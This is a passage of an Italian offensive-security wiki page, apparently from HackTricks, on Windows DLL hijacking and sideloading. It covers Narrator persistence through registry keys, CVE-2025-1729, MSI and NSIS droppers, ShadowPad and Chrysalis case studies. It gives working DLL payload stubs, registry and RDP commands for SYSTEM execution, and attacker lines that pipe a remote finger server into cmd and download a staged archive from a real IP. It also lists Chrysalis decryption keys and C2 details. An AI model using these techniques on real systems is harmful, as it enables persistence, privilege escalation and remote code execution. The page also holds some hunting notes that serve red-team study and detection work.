- Un hijack ingenuo parlerà/metterà in evidenza l'interfaccia utente. Per restare silenziosi, all'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e applicagli `SuspendThread`; continua nel tuo thread. Consulta il PoC per il codice completo.<sup>[[8]](#references)</sup>

Trigger e persistenza tramite la configurazione di Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, l'avvio di Narrator carica la DLL inserita. Sul secure desktop (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.

Esecuzione SYSTEM attivata tramite RDP (movimento laterale)
- Consenti il classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Effettua RDP verso l'host, nella schermata di accesso premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa: esegui prontamente l'inject/migrate.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (ad esempio, CursorIndicator), modificarla per puntare a un binary/DLL arbitrario, importarla e poi impostare `configuration` sul nome di quell'AT. In questo modo viene effettuato il proxy di un'esecuzione arbitraria tramite il framework di Accessibility.

Note
- La scrittura in `%windir%\System32` e la modifica dei valori HKLM richiedono diritti di amministratore.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra il **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguito ogni giorno alle 9:30 sotto il contesto dell'utente che ha effettuato l'accesso.
- **Directory Permissions**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
- **Comportamento della ricerca delle DLL**: tenta innanzitutto di caricare `hostfxr.dll` dalla working directory e registra "NAME NOT FOUND" se manca, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un attacker può inserire uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice sotto il contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso dell'attacco

1. Come utente standard, inserisci `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi l'esecuzione del scheduled task alle 9:30 sotto il contesto dell'utente corrente.
3. Se un amministratore ha effettuato l'accesso quando il task viene eseguito, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Combina le tecniche standard di UAC bypass per elevare i privilegi dall'integrità media ai privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli attori delle minacce associano frequentemente dropper basati su MSI al DLL side-loading per eseguire payload all'interno di un processo attendibile e firmato.<sup>[[10]](#references)</sup>

Panoramica della catena
- L'utente scarica un MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (ad esempio, un'azione LaunchApplication o VBScript) e ricostruisce lo stage successivo a partire dalle risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllato dall'attaccante).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla working directory, eseguendo il codice dell'attaccante sotto un parent firmato (ATT&CK T1574.001).

Analisi MSI (cosa cercare)
- Tabella CustomAction:
- Cerca voci che eseguono eseguibili o VBScript. Pattern sospetto di esempio: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), esamina CustomAction, InstallExecuteSequence e Binary tables.
- Payload incorporati/divisi nel CAB dell'MSI:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- In alternativa, usa lessmsi: lessmsi x package.msi C:\out
- Cerca più frammenti di piccole dimensioni concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading con wsc_proxy.exe
- Inserisci questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria directory.
- wsc.dll: DLL dell'attaccante. Se non sono richiesti export specifici, DllMain può essere sufficiente; in caso contrario, crea una proxy DLL e inoltra gli export richiesti alla libreria autentica eseguendo il payload in DllMain.
- Crea una DLL minimale contenente il payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di esportazione, usa un framework di proxying (ad es., DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome della DLL da parte del binario host. Se l'host usa percorsi assoluti o flag di caricamento sicuro (ad es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack potrebbe non riuscire.
- KnownDLLs, SxS ed export inoltrati possono influenzare la precedenza e devono essere considerati durante la selezione del binario host e dell'insieme di export.

## Triadi firmate + payload criptati (caso di studio ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per confondersi con software legittimo, mantenendo al contempo il payload principale criptato su disco:<sup>[[12]](#references)</sup>

1. **EXE host firmato** – vengono abusati vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attacker rinominano l'eseguibile facendolo sembrare un binario Windows (ad esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **DLL loader malevola** – viene depositata accanto all'EXE con il nome previsto (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è individuare il blob criptato, decriptarlo e mappare ShadowPad tramite reflection.
3. **Blob di payload criptato** – spesso viene archiviato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decriptato, il loader elimina il file TMP per distruggere le prove forensi.

Note di tradecraft:

* Rinominare l'EXE firmato (mantenendo l'`OriginalFileName` originale nell'header PE) gli consente di camuffarsi da binario Windows mantenendo al contempo la firma del vendor; replica quindi l'abitudine di Ink Dragon di depositare binari dall'aspetto di `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l'eseguibile rimane trusted, la maggior parte dei controlli di allowlisting deve solo consentire alla DLL malevola di trovarsi accanto a esso. Concentrati sulla personalizzazione della DLL loader; il parent firmato può generalmente essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia scrivibile, così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile fino al caricamento del payload; una volta in memoria, il file TMP può essere eliminato in sicurezza per l'OPSEC.

### Stager LOLBAS + catena di sideloading di archivi staged (finger → tar/curl → WMI)

Gli operatori combinano il DLL sideloading con LOLBAS, in modo che l'unico artifact personalizzato su disco sia la DLL malevola accanto all'EXE trusted:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera i comandi da un server Finger e li inoltra a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` recupera testo tramite TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di ruotare il server del second stage lato server.

- **Download/estrazione integrati:** scarica un archivio con un'estensione benigna, decomprimilo e prepara il target del sideloading insieme alla DLL in una cartella `%LocalAppData%` casuale:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde l'avanzamento e segue i redirect; `tar -xf` usa il tar integrato di Windows.

- **Avvio WMI/CIM:** avvia l'EXE tramite WMI, così la telemetria mostra un processo creato da CIM mentre carica la DLL colocata:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binari che preferiscono DLL locali (ad es., `intelbq.exe`, `nearby_share.exe`); il payload (ad es., Remcos) viene eseguito con il nome trusted.

- **Hunting:** genera un alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è un comportamento non comune al di fuori degli script di amministrazione.


## Caso di studio: dropper NSIS + sideloading di Bitdefender Submission Wizard (Chrysalis)

Una recente intrusione di Lotus Blossom ha abusato di una catena di aggiornamento trusted per distribuire un dropper impacchettato con NSIS, che preparava un DLL sideloading e payload completamente in-memory.<sup>[[13]](#references)</sup>

Flusso di tradecraft
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo contrassegna come **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob criptato `BluetoothService`, quindi avvia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob tramite mmap; `LogWrite` lo decripta con uno stream basato su LCG personalizzato (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera i dati temporanei e vi esegue un jump.
- Per evitare una IAT, il loader risolve le API tramite hashing dei nomi degli export usando **FNV-1a basis 0x811C9DC5 + prime 0x100019**, quindi applica un avalanche in stile Murmur (**0x85EBCA6B**) e confronta il risultato con hash target salted.

Shellcode principale (Chrysalis)
- Decripta un modulo principale simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` per cinque passaggi, quindi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce le stringhe dei nomi delle DLL a runtime tramite trasformazioni bit-rotate/XOR per carattere, quindi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre il **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con un mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione embedded e C2
- La configurazione si trova all'interno del file `BluetoothService` depositato all'**offset 0x30808** (dimensione **0x980**) ed è decriptata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL del C2 e lo User-Agent.
- I beacon costruiscono un host profile delimitato da punti, antepongono il tag `4Q`, quindi lo criptano con RC4 usando la chiave `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte vengono decriptate con RC4 e gestite tramite uno switch di tag (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` enumerazione di drive/file + casi di trasferimento chunked).
- La execution mode è controllata dagli argomenti CLI: nessun argomento = installa la persistence (service/Run key) puntando a `-i`; `-i` riavvia se stesso con `-k`; `-k` salta l'installazione ed esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha depositato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il codice sorgente C fornito dall'attacker incorporava shellcode, che veniva compilato ed eseguito in-memory senza scrivere su disco un PE. Replica con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase di compilazione ed esecuzione basata su TCC importava `Wininet.dll` a runtime e prelevava una shellcode di secondo stadio da un URL hardcoded, fornendo un loader flessibile che si mascherava da esecuzione del compilatore.

## Sideloading tramite host firmato con proxying degli export + parcheggio del thread dell'host

Alcune catene di DLL sideloading aggiungono **stability engineering** affinché l'host legittimo rimanga attivo abbastanza a lungo da caricare correttamente gli stadi successivi, invece di andare in crash dopo il caricamento della DLL malevola.<sup>[[11]](#references)</sup>

Pattern osservato
- Posizionare un EXE trusted accanto a una DLL malevola usando il nome della dipendenza previsto, ad esempio `version.dll`.
- La DLL malevola fa da **proxy per ogni export previsto** verso la DLL di sistema reale, ad esempio `%SystemRoot%\\System32\\version.dll`, in modo che la risoluzione degli import abbia successo e il processo host continui a funzionare.
- Dopo il caricamento, la DLL malevola **modifica l'entry point dell'host** affinché il thread principale entri in un loop infinito di `Sleep` invece di terminare o eseguire percorsi di codice che terminerebbero il processo.
- Un nuovo thread esegue il lavoro malevolo reale: decritta il nome o il percorso della DLL di secondo stadio (RC4/XOR sono comuni), quindi la avvia con `LoadLibrary`.

Perché è importante
- Il normale proxying delle DLL preserva la compatibilità API, ma non garantisce che l'host rimanga attivo abbastanza a lungo per gli stadi successivi.
- Mettere il thread principale in pausa con `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo firmato mentre il loader esegue la decrittazione, lo staging o il bootstrap di rete in un worker thread.
- La ricerca limitata a una `DllMain` sospetta può non rilevare questo pattern se il comportamento interessante avviene dopo la modifica dell'entry point dell'host e l'avvio di un thread secondario.

Workflow minimo
1. Copiare l'EXE dell'host firmato e determinare la DLL che risolve dalla directory locale.
2. Creare una proxy DLL che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, creare un worker thread.
4. Da quel thread, modificare l'entry point dell'host o la routine di avvio del thread principale affinché esegua un loop su `Sleep`.
5. Decrittare il nome/la configurazione della DLL di secondo stadio e chiamare `LoadLibrary` oppure eseguire il manual mapping del payload.

Pivot difensivi
- Processi firmati che caricano `version.dll` o librerie altrettanto comuni dalla propria directory applicativa invece che da `System32`.
- Patch in memoria all'entry point del processo poco dopo il caricamento dell'immagine, in particolare jump/call reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una proxy DLL che chiamano immediatamente `LoadLibrary` su una seconda DLL con un nome decrittato.
- Proxy DLL con tutti gli export posizionate accanto a eseguibili dei vendor all'interno di staging directory scrivibili come `ProgramData`, `%TEMP%` o percorsi di archivi decompressi.

## References

- [1] [Red Canary – Approfondimenti di intelligence: gennaio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interessi convergenti: analisi dei cluster di minacce che prendono di mira un governo del Sud-est asiatico](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Azioni delle attività](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
